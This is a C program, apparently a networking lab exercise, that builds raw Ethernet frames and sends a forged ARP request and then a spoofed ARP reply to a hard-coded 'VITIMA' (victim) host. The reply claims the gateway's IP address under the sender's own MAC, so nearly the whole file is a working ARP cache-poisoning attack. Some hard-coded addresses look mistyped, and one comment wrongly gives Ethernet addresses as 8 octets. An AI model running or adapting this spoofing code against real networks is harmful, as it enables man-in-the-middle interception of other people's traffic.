/*
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 */

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>

#define VITIMA_MAC0 0x40 //0x4c
#define VITIMA_MAC1 0xf0 //0xed
#define VITIMA_MAC2 0x2f //0xde
#define VITIMA_MAC3 0x7f //0x9f
#define VITIMA_MAC4 0x55 //0xa2
#define VITIMA_MAC5 0xbf //0xcd

//ROUTER <--> sendRawEth.c <--> DEST
#define GATEWAY_IP0 192
#define GATEWAY_IP1 162
#define GATEWAY_IP2 1
#define GATEWAY_IP3 1

#define VITIMA_IP0 192
#define VITIMA_IP1 192
#define VITIMA_IP2 1
#define VITIMA_IP3 102

#define ETHER_TYPE	0x0800

#define DEFAULT_IF	"enp0s25"
#define BUF_SIZ		1518

struct arp_packet {
        uint16_t hw_type;
        uint16_t prot_type;
        uint8_t  hlen;
        uint8_t  dlen;
        uint16_t operation;
        uint8_t  sender_hwaddr[6];
        uint8_t  sender_ip[4];
        uint8_t  target_hwaddr[6];
        uint8_t  target_ip[4];
};

union arp_packet_u {
        struct arp_packet arp;
        uint8_t raw_data[sizeof(struct arp_packet)];
};

void fill_arp(struct arp_packet *pkt, int operation, const uint8_t *sender_mac,
              const uint8_t *sender_ip, const uint8_t *target_mac, const uint8_t *target_ip) {
  /* Fill ARP header */
	pkt->hw_type = htons(ARPHRD_ETHER);    //hardware type = Ethernet
	pkt->prot_type = htons(ETH_P_IP);      //protocol type = IPv4
	pkt->hlen = ETH_ALEN;                  //Ethernet addresses are 8 octets
	pkt->dlen = 4;                         //IPv4 addresses are 4 octets
	pkt->operation = htons(operation);             //1 for REQUEST, 2 for REPLY

	pkt->sender_hwaddr[0] = sender_mac[0];
	pkt->sender_hwaddr[1] = sender_mac[1];
	pkt->sender_hwaddr[2] = sender_mac[2];
	pkt->sender_hwaddr[3] = sender_mac[3];
	pkt->sender_hwaddr[4] = sender_mac[4];
	pkt->sender_hwaddr[5] = sender_mac[5];

	pkt->sender_ip[0] = sender_ip[0];
	pkt->sender_ip[1] = sender_ip[1];
	pkt->sender_ip[2] = sender_ip[2];
	pkt->sender_ip[3] = sender_ip[3];

	pkt->target_hwaddr[0] = target_mac[0];
	pkt->target_hwaddr[1] = target_mac[1];
	pkt->target_hwaddr[2] = target_mac[2];
	pkt->target_hwaddr[3] = target_mac[3];
	pkt->target_hwaddr[4] = target_mac[4];
	pkt->target_hwaddr[5] = target_mac[5];

	pkt->target_ip[0] = target_ip[0];
	pkt->target_ip[1] = target_ip[1];
	pkt->target_ip[2] = target_ip[2];
	pkt->target_ip[3] = target_ip[3];

  return;
}

void print_arp(struct arp_packet *pkt) {
  printf("\nARP - hw_type       %x\n", pkt->hw_type);
  printf("ARP - prot_type     %x\n", pkt->prot_type);
  printf("ARP - hlen          %x\n", pkt->hlen);
  printf("ARP - dlen          %x\n", pkt->dlen);
  printf("ARP - operation     %x\n", pkt->operation);
  printf("ARP - sender_hwaddr %x:%x:%x:%x:%x:%x\n", pkt->sender_hwaddr[0],
                                                    pkt->sender_hwaddr[1],
                                                    pkt->sender_hwaddr[2],
                                                    pkt->sender_hwaddr[3],
                                                    pkt->sender_hwaddr[4],
                                                    pkt->sender_hwaddr[5]);
  printf("ARP - sender_ip     %d.%d.%d.%d\n", pkt->sender_ip[0],
                                              pkt->sender_ip[1],
                                              pkt->sender_ip[2],
                                              pkt->sender_ip[3]);
  printf("ARP - target_hwaddr %x:%x:%x:%x:%x:%x\n", pkt->target_hwaddr[0],
                                                    pkt->target_hwaddr[1],
                                                    pkt->target_hwaddr[2],
                                                    pkt->target_hwaddr[3],
                                                    pkt->target_hwaddr[4],
                                                    pkt->target_hwaddr[5]);
  printf("ARP - target_ip     %d.%d.%d.%d\n", pkt->target_ip[0],
                                              pkt->target_ip[1],
                                              pkt->target_ip[2],
                                              pkt->target_ip[3]);
}

int main(int argc, char *argv[])
{
	int sockfd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	int tx_len = 0;
	uint8_t sendbuf[BUF_SIZ];
	struct ether_header *eh = (struct ether_header *) sendbuf;
	struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
  struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header));
	struct sockaddr_ll socket_address;
	char ifName[IFNAMSIZ];
  uint8_t sender_ip[4]  = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
  uint8_t target_ip[4]  = {VITIMA_IP0, VITIMA_IP1, VITIMA_IP2, VITIMA_IP3};
  uint8_t target_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}; //Initialize with broadcast for the firs request

	/* Get interface name */
	if (argc > 1)
		strcpy(ifName, argv[1]);
	else
		strcpy(ifName, DEFAULT_IF);

	/* Open RAW socket to send on */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETHER_TYPE))) == -1) {
	    perror("socket");
	}

	/* Get the index of the interface to send on */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
	    perror("SIOCGIFINDEX");
	/* Get the MAC address of the interface to send on */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
	    perror("SIOCGIFHWADDR");

	/* Construct the Ethernet header */
	memset(sendbuf, 0, BUF_SIZ);
	/* Ethernet header */
	eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
	eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
	eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
	eh->ether_dhost[0] = 0xff;
	eh->ether_dhost[1] = 0xff;
	eh->ether_dhost[2] = 0xff;
	eh->ether_dhost[3] = 0xff;
	eh->ether_dhost[4] = 0xff;
	eh->ether_dhost[5] = 0xff;
	/* Ethertype field */
  eh->ether_type = htons(ETH_P_ARP);
	tx_len += sizeof(struct ether_header);
  /* Index of the network device */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	/* Address length*/
	socket_address.sll_halen = ETH_ALEN;
	/* Destination MAC */
	socket_address.sll_addr[0] = 0xff;
	socket_address.sll_addr[1] = 0xff;
	socket_address.sll_addr[2] = 0xff;
	socket_address.sll_addr[3] = 0xff;
	socket_address.sll_addr[4] = 0xff;
	socket_address.sll_addr[5] = 0xff;

  tx_len += sizeof(struct arp_packet);

  /* Sending Request first */
  fill_arp(arp_payload,1,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
  print_arp(arp_payload);
  if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
	    printf("Send failed\n");

  sleep(1);

  /* Sending the reply to VITIMA*/
  target_mac[0] = VITIMA_MAC0;
  target_mac[1] = VITIMA_MAC1;
  target_mac[2] = VITIMA_MAC2;
  target_mac[3] = VITIMA_MAC3;
  target_mac[4] = VITIMA_MAC4;
  target_mac[5] = VITIMA_MAC5;
  /* Destination MAC */
  eh->ether_dhost[0] = VITIMA_MAC0;
	eh->ether_dhost[1] = VITIMA_MAC1;
	eh->ether_dhost[2] = VITIMA_MAC2;
	eh->ether_dhost[3] = VITIMA_MAC3;
	eh->ether_dhost[4] = VITIMA_MAC4;
	eh->ether_dhost[5] = VITIMA_MAC5;
	socket_address.sll_addr[0] = VITIMA_MAC0;
	socket_address.sll_addr[1] = VITIMA_MAC1;
	socket_address.sll_addr[2] = VITIMA_MAC2;
	socket_address.sll_addr[3] = VITIMA_MAC3;
	socket_address.sll_addr[4] = VITIMA_MAC4;
	socket_address.sll_addr[5] = VITIMA_MAC5;
  fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
  print_arp(arp_payload);
  if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
	    printf("Send failed\n");

	return 0;
}
